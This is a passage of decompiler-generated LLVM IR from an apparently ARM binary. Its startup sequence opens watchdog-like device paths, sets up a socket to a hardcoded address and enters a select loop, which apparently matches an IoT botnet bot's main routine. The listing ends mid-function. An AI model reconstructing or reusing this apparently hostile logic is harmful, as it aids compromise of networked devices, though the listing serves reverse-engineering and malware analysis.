  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %tmp13 = call i8 @__decompiler_undefined_function_1()
  %tmp19 = call i8 @__decompiler_undefined_function_1()
  %tmp23 = call i8 @__decompiler_undefined_function_1()
  %tmp27 = call i8 @__decompiler_undefined_function_1()
  %tmp31 = call i8 @__decompiler_undefined_function_1()
  %tmp34 = call i8 @__decompiler_undefined_function_1()
  %tmp35 = call i8 @__decompiler_undefined_function_1()
  %tmp37 = call i8 @__decompiler_undefined_function_1()
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-1616 = alloca i32, align 4
  %stack_var_-38 = alloca i8, align 1
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-592 = alloca i32, align 4
  %stack_var_-348 = alloca i32, align 4
  %stack_var_-170 = alloca i32, align 4
  %stack_var_-138 = alloca i32, align 4
  %stack_var_-72 = alloca i8, align 1
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-106 = alloca i8, align 1
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-464 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_f460 = load i32, i32* @r4, align 4
  store i32 %v3_f460, i32* %stack_var_-36, align 4
  %v6_f460 = load i32, i32* @r5, align 4
  %v15_f460 = load i32, i32* @r8, align 4
  %v2_f470 = ptrtoint i32* %stack_var_-464 to i32
  store i32 %v2_f470, i32* @r4, align 4
  store i32 %arg1, i32* @r8, align 4
  %v2_f478 = load i32, i32* %arg2, align 4
  store i32 %tmp, i32* @r6, align 4
  %v1_f480 = inttoptr i32 %v2_f478 to i8*
  %v2_f480 = call i32 @function_13998(i8* %v1_f480)
  store i32 %v2_f470, i32* @r0, align 4
  %v1_f488 = call i32 @function_14004(i32 %v2_f470)
  store i32 %v2_f470, i32* @r0, align 4
  %v2_f494 = call i32 @function_13fd4(i32 %v2_f470, i32 2)
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_f4a4 = bitcast i32* %stack_var_-464 to %_TYPEDEF_sigset_t*
  %v4_f4a4 = call i32 @function_13918(i32 0, %_TYPEDEF_sigset_t* %v3_f4a4, i32 0)
  %v2_f4b0 = call i32 @function_1401c(i32 17, i32 1)
  %v2_f4bc = call i32 @function_1401c(i32 5, i32 ptrtoint (i32* @global_var_f248.121 to i32))
  %v4_f4c8 = call i32 @function_137c8(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_15fb0.123, i32 0, i32 0), i32 2)
  %v7_f4cc = icmp eq i32 %v4_f4c8, -1
  store i32 %v4_f4c8, i32* @r4, align 4
  br i1 %v7_f4cc, label %dec_label_pc_f850, label %dec_label_pc_f4d8

dec_label_pc_f4d8:                                ; preds = %dec_label_pc_f850, %dec_label_pc_f460
  %v0_f4ec = phi i32 [ %v4_f858, %dec_label_pc_f850 ], [ %v4_f4c8, %dec_label_pc_f460 ]
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_f4f0 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_f4f0, i32* %r2.global-to-local, align 4
  store i32 1, i32* %stack_var_-48, align 4
  %v5_f4f8 = call i32 @function_1374c(i32 %v0_f4ec, i32 -2147199228, i32 %v2_f4f0, i32 1, i32 1)
  %v0_f4fc = load i32, i32* @r4, align 4
  %v1_f500 = call i32 @function_1369c(i32 %v0_f4fc)
  br label %dec_label_pc_f504

dec_label_pc_f504:                                ; preds = %dec_label_pc_f850, %dec_label_pc_f4d8
  %v2_f508 = call i32 @function_13670(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_15f60.23, i32 0, i32 0))
  %v0_f50c = call i32 @function_12f94()
  store i32 ptrtoint (i32* @global_var_1ecb8.86 to i32), i32* @fp, align 4
  store i32 ptrtoint (i8** @global_var_1ecc4.116 to i32), i32* @lr, align 4
  store i32 0, i32* @r4, align 4
  store i32 80, i32* %r3.global-to-local, align 4
  %v2_f528 = ptrtoint i8* %stack_var_-106 to i32
  store i32 2, i32* @r7, align 4
  store i8 80, i8* bitcast (i32* @global_var_1ecc7.118 to i8*), align 4
  store i32 902487617, i32* @global_var_1ecc8.117, align 4
  store i8 0, i8* bitcast (i32* @global_var_1ecc6.119 to i8*), align 4
  store i8 0, i8* bitcast (i32* @global_var_1ecc5.128 to i8*), align 4
  store i32 %v0_f50c, i32* @global_var_1ecb8.86, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_16004.130 to i32), i32* @r1, align 4
  store i32 18, i32* @r2, align 4
  store i8 2, i8* bitcast (i8** @global_var_1ecc4.116 to i8*), align 4
  store i32 %v2_f528, i32* @r0, align 4
  %v0_f554 = load i32, i32* @r6, align 4
  %v1_f554 = inttoptr i32 %v0_f554 to i32*
  %v2_f554 = load i32, i32* %v1_f554, align 4
  store i32 %v2_f554, i32* @r5, align 4
  %v4_f558 = call i32 @function_13cb0(i32 %v2_f528, i32 ptrtoint ([3 x i8]* @global_var_16004.130 to i32), i32 18)
  store i32 ptrtoint (i32* @global_var_16000.145 to i32), i32* @r4, align 4
  %v13_f578 = ptrtoint i32* %stack_var_-176 to i32
  store i32 %v13_f578, i32* @lr, align 4
  store i32 add (i32 add (i32 ptrtoint (i32* @global_var_122f8.140 to i32), i32 add (i32 add (i32 add (i32 ptrtoint (i32* @global_var_f260.133 to i32), i32 ptrtoint (i32* @global_var_123b0.135 to i32)), i32 74444), i32 ptrtoint (i32* @global_var_12468.138 to i32))), i32 155156), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_f248.121 to i32), i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_f248.121 to i32), i32* %stack_var_-176, align 4
  br i1 icmp eq (i32 add (i32 add (i32 ptrtoint (i32* @global_var_122f8.140 to i32), i32 add (i32 add (i32 add (i32 ptrtoint (i32* @global_var_f260.133 to i32), i32 ptrtoint (i32* @global_var_123b0.135 to i32)), i32 74444), i32 ptrtoint (i32* @global_var_12468.138 to i32))), i32 155156), i32 0), label %dec_label_pc_f754, label %dec_label_pc_f5c0

dec_label_pc_f5c0:                                ; preds = %dec_label_pc_f504
  %v3_f5c0 = load i8, i8* %stack_var_-106, align 1
  %v4_f5c0 = sext i8 %v3_f5c0 to i32
  store i32 %v4_f5c0, i32* %r2.global-to-local, align 4
  %v4_f5c4 = zext i8 %tmp37 to i32
  store i32 %v4_f5c4, i32* %r3.global-to-local, align 4
  %v0_f5c8 = load i32, i32* @r5, align 4
  store i8 %tmp37, i8* %stack_var_-72, align 1
  %v1_f5d4 = inttoptr i32 %v0_f5c8 to i8*
  %v2_f5d4 = call i32 @function_12cdc(i8* %v1_f5d4)
  %v0_f5dc = load i32, i32* @r7, align 4
  %v2_f5e0 = call i32 @function_134c4(i32 %v0_f5dc, i32 %v2_f5d4)
  %v4_f5e4 = zext i8 %tmp35 to i32
  store i32 %v4_f5e4, i32* %r2.global-to-local, align 4
  %v4_f5e8 = zext i8 %tmp34 to i32
  store i32 %v4_f5e8, i32* %r3.global-to-local, align 4
  %v0_f5ec = load i32, i32* @r5, align 4
  %v2_f5ec = add i32 %v0_f5ec, %v2_f5e0
  %v3_f5ec = inttoptr i32 %v2_f5ec to i8*
  %v4_f5ec = load i8, i8* %v3_f5ec, align 1
  %v6_f5ec = zext i8 %v4_f5ec to i32
  store i32 %v6_f5ec, i32* %r4.global-to-local, align 4
  %v1_f5fc = inttoptr i32 %v0_f5ec to i8*
  %v2_f5fc = call i32 @function_12cdc(i8* %v1_f5fc)
  %v2_f608 = call i32 @function_134c4(i32 4, i32 %v2_f5fc)
  %v1_f60c = sub nuw nsw i32 -1, %v6_f5ec
  store i32 %v1_f60c, i32* %r4.global-to-local, align 4
  %v0_f610 = load i32, i32* @r5, align 4
  %v2_f610 = add i32 %v0_f610, %v2_f608
  %v3_f610 = inttoptr i32 %v2_f610 to i8*
  %v4_f610 = load i8, i8* %v3_f610, align 1
  %v6_f610 = zext i8 %v4_f610 to i32
  %v4_f614 = zext i8 %tmp31 to i32
  store i32 %v4_f614, i32* %r2.global-to-local, align 4
  %v1_f61c = sub nuw nsw i32 -82, %v6_f5ec
  %v1_f620 = sub nuw nsw i32 -1, %v6_f610
  store i32 %v1_f620, i32* %r3.global-to-local, align 4
  %v1_f628 = urem i32 %v1_f61c, 256
  %v2_f62c = add nsw i32 %v1_f628, %v1_f620
  store i32 %v2_f62c, i32* %r4.global-to-local, align 4
  %v1_f638 = inttoptr i32 %v0_f610 to i8*
  %v2_f638 = call i32 @function_12cdc(i8* %v1_f638)
  %v2_f644 = call i32 @function_134c4(i32 6, i32 %v2_f638)
  %v0_f648 = load i32, i32* @r5, align 4
  %v2_f648 = add i32 %v0_f648, %v2_f644
  %v3_f648 = inttoptr i32 %v2_f648 to i8*
  %v4_f648 = load i8, i8* %v3_f648, align 1
  %v6_f648 = zext i8 %v4_f648 to i32
  %v4_f64c = zext i8 %tmp27 to i32
  store i32 %v4_f64c, i32* %r2.global-to-local, align 4
  %v1_f654 = sub nuw nsw i32 -1, %v6_f648
  store i32 %v1_f654, i32* %r3.global-to-local, align 4
  %v0_f65c = load i32, i32* %r4.global-to-local, align 4
  %v1_f65c = urem i32 %v0_f65c, 256
  %v2_f660 = add nsw i32 %v1_f65c, %v1_f654
  store i32 %v2_f660, i32* %r4.global-to-local, align 4
  %v1_f66c = inttoptr i32 %v0_f648 to i8*
  %v2_f66c = call i32 @function_12cdc(i8* %v1_f66c)
  %v2_f678 = call i32 @function_134c4(i32 8, i32 %v2_f66c)
  %v0_f67c = load i32, i32* @r5, align 4
  %v2_f67c = add i32 %v0_f67c, %v2_f678
  %v3_f67c = inttoptr i32 %v2_f67c to i8*
  %v4_f67c = load i8, i8* %v3_f67c, align 1
  %v6_f67c = zext i8 %v4_f67c to i32
  %v4_f680 = zext i8 %tmp23 to i32
  store i32 %v4_f680, i32* %r2.global-to-local, align 4
  %v1_f688 = sub nuw nsw i32 -1, %v6_f67c
  store i32 %v1_f688, i32* %r3.global-to-local, align 4
  %v0_f690 = load i32, i32* %r4.global-to-local, align 4
  %v1_f690 = urem i32 %v0_f690, 256
  %v2_f694 = add nsw i32 %v1_f690, %v1_f688
  store i32 %v2_f694, i32* %r4.global-to-local, align 4
  %v1_f6a0 = inttoptr i32 %v0_f67c to i8*
  %v2_f6a0 = call i32 @function_12cdc(i8* %v1_f6a0)
  %v2_f6ac = call i32 @function_134c4(i32 10, i32 %v2_f6a0)
  %v0_f6b0 = load i32, i32* @r5, align 4
  %v2_f6b0 = add i32 %v0_f6b0, %v2_f6ac
  %v3_f6b0 = inttoptr i32 %v2_f6b0 to i8*
  %v4_f6b0 = load i8, i8* %v3_f6b0, align 1
  %v6_f6b0 = zext i8 %v4_f6b0 to i32
  %v4_f6b4 = zext i8 %tmp19 to i32
  store i32 %v4_f6b4, i32* %r2.global-to-local, align 4
  %v1_f6bc = sub nuw nsw i32 -1, %v6_f6b0
  store i32 %v1_f6bc, i32* %r3.global-to-local, align 4
  %v0_f6c4 = load i32, i32* %r4.global-to-local, align 4
  %v1_f6c4 = urem i32 %v0_f6c4, 256
  %v2_f6c8 = add nsw i32 %v1_f6c4, %v1_f6bc
  store i32 %v2_f6c8, i32* %r4.global-to-local, align 4
  %v1_f6d4 = inttoptr i32 %v0_f6b0 to i8*
  %v2_f6d4 = call i32 @function_12cdc(i8* %v1_f6d4)
  %v2_f6e0 = call i32 @function_134c4(i32 12, i32 %v2_f6d4)
  %v0_f6e4 = load i32, i32* @r5, align 4
  %v2_f6e4 = add i32 %v0_f6e4, %v2_f6e0
  %v3_f6e4 = inttoptr i32 %v2_f6e4 to i8*
  %v4_f6e4 = load i8, i8* %v3_f6e4, align 1
  %v6_f6e4 = zext i8 %v4_f6e4 to i32
  %v0_f6e8 = load i32, i32* %r4.global-to-local, align 4
  %v1_f6e8 = urem i32 %v0_f6e8, 256
  %v1_f6ec = sub nuw nsw i32 -1, %v6_f6e4
  store i32 %v1_f6ec, i32* %r3.global-to-local, align 4
  %v2_f6f0 = add nsw i32 %v1_f6e8, %v1_f6ec
  store i32 %v2_f6f0, i32* %r4.global-to-local, align 4
  %fold = add i32 %v0_f6e8, %v1_f6ec
  %v1_f6f8 = urem i32 %fold, 256
  %v2_f6fc = call i32 @function_133f8(i32 %v1_f6f8, i32 9)
  %v1_f700 = load i32, i32* @r7, align 4
  %v6_f700 = shl i32 %v2_f6fc, %v1_f700
  %v2_f708 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_f708, i32* %r2.global-to-local, align 4
  %v1_f70c = and i32 %v6_f700, 1020
  %v2_f714 = add i32 %v1_f70c, %v2_f708
  %v2_f718 = ptrtoint i8* %stack_var_-72 to i32
  store i32 %v2_f718, i32* @r4, align 4
  store i32 63268, i32* @lr, align 4
  %v1_f720 = add i32 %v2_f714, -172
  %v2_f720 = inttoptr i32 %v1_f720 to i32*
  %v3_f720 = load i32, i32* %v2_f720, align 4
  call void @__pseudo_branch(i32 %v3_f720)
  %v0_f724 = load i32, i32* @r5, align 4
  %v2_f72c = inttoptr i32 %v0_f724 to i8*
  %v3_f72c = call i32 @function_130bc(i8* %v2_f72c, i32 %v2_f718)
  store i32 %v3_f72c, i32* @r5, align 4
  %v2_f73c = call i32 @function_12d7c(i32 %v2_f528, i32 18)
  %v2_f748 = call i32 @function_12d7c(i32 %v2_f718, i32 12)
  %v0_f74c = load i32, i32* @r5, align 4
  %v1_f74c = urem i32 %v0_f74c, 256
  %v2_f74c = icmp eq i32 %v1_f74c, 0
  br i1 %v2_f74c, label %dec_label_pc_f754, label %dec_label_pc_f86c

dec_label_pc_f754:                                ; preds = %dec_label_pc_f5c0, %dec_label_pc_f504, %dec_label_pc_f86c
  %v2_f758 = ptrtoint i32* %stack_var_-138 to i32
  store i32 %v2_f758, i32* @sl, align 4
  %v0_f75c = call i32 @function_f260()
  %v1_f760 = call i32 @function_feb8(i32 %v0_f75c)
  %v2_f76c = call i32 @function_12d7c(i32 %v2_f758, i32 32)
  %v0_f770 = load i32, i32* @r8, align 4
  %v7_f770 = icmp eq i32 %v0_f770, 2
  br i1 %v7_f770, label %dec_label_pc_f878, label %dec_label_pc_f778

dec_label_pc_f778:                                ; preds = %dec_label_pc_f878, %dec_label_pc_f754, %dec_label_pc_f888
  %v0_f778 = call i32 @function_fe60()
  %v1_f77c = mul i32 %v0_f778, 4
  %v3_f780 = and i32 %v1_f77c, 12
  %v2_f788 = ptrtoint i32* %stack_var_-170 to i32
  store i32 %v2_f788, i32* @r5, align 4
  %v1_f78c = add nuw nsw i32 %v3_f780, 12
  store i32 %v1_f78c, i32* @r4, align 4
  %v2_f798 = call i32 @function_ff14(i32 %v2_f788, i32 %v1_f78c)
  %v2_f7a0 = ptrtoint i32* %stack_var_-36 to i32
  %v1_f7a4 = load i32, i32* @r4, align 4
  %v2_f7a4 = add i32 %v1_f7a4, %v2_f7a0
  store i32 %v2_f7a4, i32* %r3.global-to-local, align 4
  %v0_f7a8 = load i32, i32* @r6, align 4
  %v1_f7a8 = inttoptr i32 %v0_f7a8 to i32*
  %v2_f7a8 = load i32, i32* %v1_f7a8, align 4
  store i32 %v2_f7a8, i32* @r0, align 4
  store i32 0, i32* @r6, align 4
  %v3_f7b0 = add i32 %v2_f7a4, -134
  %v4_f7b0 = inttoptr i32 %v3_f7b0 to i8*
  store i8 0, i8* %v4_f7b0, align 1
  %v2_f7b8 = inttoptr i32 %v2_f7a8 to i8*
  %v3_f7b8 = call i32 @function_12d04(i8* %v2_f7b8, i32 %v2_f788)
  %v0_f7bc = call i32 @function_fe60()
  %v2_f7c4 = call i32 @function_133f8(i32 %v0_f7bc, i32 6)
  %v3_f7c8 = mul i32 %v2_f7c4, 4
  %v1_f7cc = add i32 %v3_f7c8, 12
  store i32 %v1_f7cc, i32* @r4, align 4
  %v2_f7d8 = call i32 @function_ff14(i32 %v2_f788, i32 %v1_f7cc)
  store i32 %v2_f7a0, i32* %r2.global-to-local, align 4
  %v1_f7e4 = load i32, i32* @r4, align 4
  %v2_f7e4 = add i32 %v1_f7e4, %v2_f7a0
  store i32 %v2_f7e4, i32* %r3.global-to-local, align 4
  %v0_f7e8 = load i32, i32* @r6, align 4
  %v1_f7e8 = trunc i32 %v0_f7e8 to i8
  %v3_f7e8 = add i32 %v2_f7e4, -134
  %v4_f7e8 = inttoptr i32 %v3_f7e8 to i8*
  store i8 %v1_f7e8, i8* %v4_f7e8, align 1
  %v4_f7f4 = call i32 @function_13834(i32 15, i32 %v2_f788, i32 %v2_f7a0, i32 %v2_f7e4)
  %v1_f7fc = call i32 @function_123b0(i32 2)
  %v3_f808 = call i32 @function_122cc(i32 2, i32* nonnull %stack_var_-44)
  %v3_f80c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_f80c, i32* %r2.global-to-local, align 4
  %v3_f818 = inttoptr i32 %v3_f808 to i32*
  %v4_f818 = call i32 @function_139c4(i32 1, i32* %v3_f818, i32 %v3_f80c)
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_f828 = call i32 @function_139c4(i32 1, i32* nonnull @global_var_15fd4.147, i32 1)
  %v1_f830 = call i32 @function_122f8(i32 2)
  %v0_f834 = call i32 @function_136c8()
  %v1_f838 = load i32, i32* @r6, align 4
  %v7_f83c = icmp sgt i32 %v0_f834, %v1_f838
  br i1 %v7_f83c, label %dec_label_pc_f840, label %dec_label_pc_f8b0

dec_label_pc_f840:                                ; preds = %dec_label_pc_f778
  %v2_f84c = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_f84c, i32* %r4.global-to-local, align 4
  store i32 %v6_f460, i32* %r5.global-to-local, align 4
  store i32 %v15_f460, i32* %r8.global-to-local, align 4
  ret i32 0

dec_label_pc_f850:                                ; preds = %dec_label_pc_f460
  %v4_f858 = call i32 @function_137c8(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_15fc0.149, i32 0, i32 0), i32 2)
  %v3_f85c = icmp eq i32 %v4_f858, -1
  store i32 %v4_f858, i32* @r4, align 4
  br i1 %v3_f85c, label %dec_label_pc_f504, label %dec_label_pc_f4d8

dec_label_pc_f86c:                                ; preds = %dec_label_pc_f5c0
  %v1_f870 = call i32 @function_13fbc(i32 5)
  br label %dec_label_pc_f754

dec_label_pc_f878:                                ; preds = %dec_label_pc_f754
  %v0_f878 = load i32, i32* @r6, align 4
  %v1_f878 = add i32 %v0_f878, 4
  %v2_f878 = inttoptr i32 %v1_f878 to i32*
  %v3_f878 = load i32, i32* %v2_f878, align 4
  %v1_f87c = inttoptr i32 %v3_f878 to i8*
  %v2_f87c = call i32 @function_12cdc(i8* %v1_f87c)
  %v8_f884 = icmp sgt i32 %v2_f87c, 31
  br i1 %v8_f884, label %dec_label_pc_f778, label %dec_label_pc_f888

dec_label_pc_f888:                                ; preds = %dec_label_pc_f878
  %v0_f888 = load i32, i32* @r6, align 4
  %v1_f888 = add i32 %v0_f888, 4
  %v2_f888 = inttoptr i32 %v1_f888 to i32*
  %v3_f888 = load i32, i32* %v2_f888, align 4
  store i32 %v2_f758, i32* @r0, align 4
  %v2_f890 = bitcast i32* %stack_var_-138 to i8*
  %v3_f890 = call i32 @function_12d04(i8* %v2_f890, i32 %v3_f888)
  %v0_f894 = load i32, i32* @r6, align 4
  %v1_f894 = add i32 %v0_f894, 4
  %v2_f894 = inttoptr i32 %v1_f894 to i32*
  %v3_f894 = load i32, i32* %v2_f894, align 4
  store i32 %v3_f894, i32* %r4.global-to-local, align 4
  %v1_f89c = inttoptr i32 %v3_f894 to i8*
  %v2_f89c = call i32 @function_12cdc(i8* %v1_f89c)
  %v2_f8a8 = call i32 @function_12d7c(i32 %v3_f894, i32 %v2_f89c)
  br label %dec_label_pc_f778

dec_label_pc_f8b0:                                ; preds = %dec_label_pc_f778
  %v1_f8b0 = call i32 @function_138ec(i32 %v0_f834)
  %v0_f8b8 = load i32, i32* @r6, align 4
  %v1_f8bc = call i32 @function_1369c(i32 %v0_f8b8)
  %v1_f8c4 = call i32 @function_1369c(i32 1)
  %v1_f8cc = call i32 @function_1369c(i32 2)
  %v2_f8d0 = ptrtoint i32* %stack_var_-348 to i32
  store i32 %v2_f8d0, i32* @r7, align 4
  %v1_f8d4 = call i32 @function_a558(i32 %v1_f8cc)
  store i32 ptrtoint (i32* @global_var_1ea8c.151 to i32), i32* @sb, align 4
  %v1_f8dc = call i32 @function_eab0(i32 %v1_f8d4)
  %v0_f8e0 = call i32 @function_1091c()
  %v0_f8e4 = load i32, i32* @r6, align 4
  %v2_f8ec = ptrtoint i32* %stack_var_-592 to i32
  store i32 %v2_f8ec, i32* @r6, align 4
  %v2_f8f0 = ptrtoint i32* %stack_var_-336 to i32
  store i32 %v2_f8f0, i32* @r7, align 4
  %v2_f9d0 = ptrtoint i32* %stack_var_-60 to i32
  %v5_fc8c = bitcast i8* %stack_var_-38 to i32*
  %v2_fbb4 = ptrtoint i32* %stack_var_-1616 to i32
  %v2_fca4 = ptrtoint i32* %stack_var_-48 to i32
  %v2_fca8 = ptrtoint i32* %stack_var_-52 to i32
  %v1_fd38 = bitcast i32* %stack_var_-138 to i8*
  %v5_fd0c = bitcast i32* %stack_var_-88 to %sockaddr*
  %v1_fd24 = sub i32 0, %v1_f8b0
  br label %dec_label_pc_f8f4

dec_label_pc_f8f4:                                ; preds = %dec_label_pc_f8f4.backedge, %dec_label_pc_f8b0
  %v2_f8fc87 = phi i32 [ %v2_f8ec, %dec_label_pc_f8b0 ], [ %v2_f8fc87.pre, %dec_label_pc_f8f4.backedge ]
  %stack_var_-37.0 = phi i8 [ %tmp13, %dec_label_pc_f8b0 ], [ %stack_var_-37.0.be, %dec_label_pc_f8f4.backedge ]
  %stack_var_-1620.0 = phi i32 [ %v0_f8e4, %dec_label_pc_f8b0 ], [ %stack_var_-1620.0.be, %dec_label_pc_f8f4.backedge ]
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v4_f8fc89 = inttoptr i32 %v2_f8fc87 to i32*
  store i32 0, i32* %v4_f8fc89, align 4
  %v0_f90090 = load i32, i32* %r3.global-to-local, align 4
  %v1_f90091 = add i32 %v0_f90090, 4
  store i32 %v1_f90091, i32* %r3.global-to-local, align 4
  %v7_f90492 = icmp eq i32 %v1_f90091, 128
  br i1 %v7_f90492, label %dec_label_pc_f90c, label %dec_label_pc_f8fc.dec_label_pc_f8fc_crit_edge

dec_label_pc_f8fc.dec_label_pc_f8fc_crit_edge:    ; preds = %dec_label_pc_f8f4, %dec_label_pc_f8fc.dec_label_pc_f8fc_crit_edge
  %v1_f90093 = phi i32 [ %v1_f900, %dec_label_pc_f8fc.dec_label_pc_f8fc_crit_edge ], [ %v1_f90091, %dec_label_pc_f8f4 ]
  %v0_f8fc.pre = load i32, i32* %r2.global-to-local, align 4
  %v2_f8fc = load i32, i32* @r6, align 4
  %v3_f8fc = add i32 %v2_f8fc, %v1_f90093
  %v4_f8fc = inttoptr i32 %v3_f8fc to i32*
  store i32 %v0_f8fc.pre, i32* %v4_f8fc, align 4
  %v0_f900 = load i32, i32* %r3.global-to-local, align 4
  %v1_f900 = add i32 %v0_f900, 4
  store i32 %v1_f900, i32* %r3.global-to-local, align 4
  %v7_f904 = icmp eq i32 %v1_f900, 128
  br i1 %v7_f904, label %dec_label_pc_f90c, label %dec_label_pc_f8fc.dec_label_pc_f8fc_crit_edge

dec_label_pc_f90c:                                ; preds = %dec_label_pc_f8fc.dec_label_pc_f8fc_crit_edge, %dec_label_pc_f8f4
  %v0_f90c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_f90c, i32* %r3.global-to-local, align 4
  store i32 %v0_f90c, i32* @r4, align 4
  %v2_f91494 = load i32, i32* @r7, align 4
  %v3_f91495 = add i32 %v2_f91494, %v0_f90c
  %v4_f91496 = inttoptr i32 %v3_f91495 to i32*
  store i32 %v0_f90c, i32* %v4_f91496, align 4
  %v0_f91897 = load i32, i32* %r3.global-to-local, align 4
  %v1_f91898 = add i32 %v0_f91897, 4
  store i32 %v1_f91898, i32* %r3.global-to-local, align 4
  %v7_f91c99 = icmp eq i32 %v1_f91898, 128
  br i1 %v7_f91c99, label %dec_label_pc_f924, label %dec_label_pc_f914.dec_label_pc_f914_crit_edge

dec_label_pc_f914.dec_label_pc_f914_crit_edge:    ; preds = %dec_label_pc_f90c, %dec_label_pc_f914.dec_label_pc_f914_crit_edge
  %v1_f918100 = phi i32 [ %v1_f918, %dec_label_pc_f914.dec_label_pc_f914_crit_edge ], [ %v1_f91898, %dec_label_pc_f90c ]
  %v0_f914.pre = load i32, i32* @r4, align 4
  %v2_f914 = load i32, i32* @r7, align 4
  %v3_f914 = add i32 %v2_f914, %v1_f918100
  %v4_f914 = inttoptr i32 %v3_f914 to i32*
  store i32 %v0_f914.pre, i32* %v4_f914, align 4
  %v0_f918 = load i32, i32* %r3.global-to-local, align 4
  %v1_f918 = add i32 %v0_f918, 4
  store i32 %v1_f918, i32* %r3.global-to-local, align 4
  %v7_f91c = icmp eq i32 %v1_f918, 128
  br i1 %v7_f91c, label %dec_label_pc_f924, label %dec_label_pc_f914.dec_label_pc_f914_crit_edge

dec_label_pc_f924:                                ; preds = %dec_label_pc_f914.dec_label_pc_f914_crit_edge, %dec_label_pc_f90c
  store i32 ptrtoint (i32* @global_var_1ea88.111 to i32), i32* %r3.global-to-local, align 4
  %v2_f928 = load i32, i32* @global_var_1ea88.111, align 4
  %v7_f92c = icmp eq i32 %v2_f928, -1
  br i1 %v7_f92c, label %dec_label_pc_f95c, label %dec_label_pc_f934

dec_label_pc_f934:                                ; preds = %dec_label_pc_f924
  %v3_f934 = udiv i32 %v2_f928, 32
  %v3_f93c = mul nuw nsw i32 %v3_f934, 4
  %v2_f944 = add i32 %v3_f93c, %v2_f7a0
  store i32 %v2_f944, i32* %r3.global-to-local, align 4
  %v1_f948 = add i32 %v2_f944, -556
  %v2_f948 = inttoptr i32 %v1_f948 to i32*
  %v3_f948 = load i32, i32* %v2_f948, align 4
  %v1_f94c = urem i32 %v2_f928, 32
  %v7_f954 = shl i32 1, %v1_f94c
  %v8_f954 = or i32 %v3_f948, %v7_f954
  store i32 %v8_f954, i32* %r2.global-to-local, align 4
  store i32 %v8_f954, i32* %v2_f948, align 4
  br label %dec_label_pc_f95c

dec_label_pc_f95c:                                ; preds = %dec_label_pc_f924, %dec_label_pc_f934
  %v2_f95c = load i32, i32* @global_var_1ea8c.151, align 4
  store i32 %v2_f95c, i32* %r3.global-to-local, align 4
  %v7_f960 = icmp eq i32 %v2_f95c, -1
  store i32 ptrtoint (i32* @global_var_1ea8c.151 to i32), i32* %r8.global-to-local, align 4
  br i1 %v7_f960, label %dec_label_pc_fc04, label %dec_label_pc_f96c

dec_label_pc_f96c:                                ; preds = %dec_label_pc_f95c, %dec_label_pc_fc04, %.thread
  store i32 ptrtoint (i8** @global_var_1ec28.154 to i32), i32* %r2.global-to-local, align 4
  %v2_f970 = load i8, i8* bitcast (i8** @global_var_1ec28.154 to i8*), align 4
  %v3_f970 = zext i8 %v2_f970 to i32
  store i32 %v3_f970, i32* %r3.global-to-local, align 4
  %v2_f974 = icmp eq i8 %v2_f970, 0
  %v2_fac4 = load i32, i32* @global_var_1ea8c.151, align 4
  %v3_facc = udiv i32 %v2_fac4, 32
  br i1 %v2_f974, label %dec_label_pc_fac4, label %dec_label_pc_f97c

dec_label_pc_f97c:                                ; preds = %dec_label_pc_f96c
  %v3_f988 = mul nuw nsw i32 %v3_facc, 4
  %v2_f990 = add i32 %v3_f988, %v2_f7a0
  store i32 %v2_f990, i32* %r3.global-to-local, align 4
  %v1_f994 = add i32 %v2_f990, -300
  %v2_f994 = inttoptr i32 %v1_f994 to i32*
  %v3_f994 = load i32, i32* %v2_f994, align 4
  %v1_f998 = urem i32 %v2_fac4, 32
  %v7_f9a0 = shl i32 1, %v1_f998
  %v8_f9a0 = or i32 %v3_f994, %v7_f9a0
  store i32 %v8_f9a0, i32* %r2.global-to-local, align 4
  store i32 %v8_f9a0, i32* %v2_f994, align 4
  br label %dec_label_pc_f9a8

dec_label_pc_f9a8:                                ; preds = %dec_label_pc_fac4, %dec_label_pc_f97c
  %v2_f9ac = load i32, i32* @global_var_1ea88.111, align 4
  %v2_f9b0 = load i32, i32* @global_var_1ea8c.151, align 4
  store i32 %v2_f9b0, i32* %r3.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  %v5_f9bc = icmp slt i32 %v2_f9ac, %v2_f9b0
  br i1 %v5_f9bc, label %bb, label %bb84

bb:                                               ; preds = %dec_label_pc_f9a8
  br label %bb84

bb84:                                             ; preds = %dec_label_pc_f9a8, %bb
  %v0_f9cc = phi i32 [ %v2_f9ac, %dec_label_pc_f9a8 ], [ %v2_f9b0, %bb ]
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 10, i32* %stack_var_-60, align 4
  %v1_f9cc = add i32 %v0_f9cc, 1
  store i32 %v2_f8f0, i32* %r2.global-to-local, align 4
  %v5_f9e4 = call i32 @function_138bc(i32 %v1_f9cc, i32 %v2_f8ec, i32 %v2_f8f0, i32 0, i32 %v2_f9d0)
  %v8_f9e8 = icmp eq i32 %v5_f9e4, -1
  store i32 %v5_f9e4, i32* %r3.global-to-local, align 4
  br i1 %v8_f9e8, label %dec_label_pc_f8f4.backedge, label %dec_label_pc_f9f4

dec_label_pc_f9f4:                                ; preds = %bb84
  %v6_f9e4 = trunc i32 %v5_f9e4 to i8
  %v3_f9f4 = icmp eq i8 %v6_f9e4, 0
  br i1 %v3_f9f4, label %dec_label_pc_f9fc, label %dec_label_pc_fa24

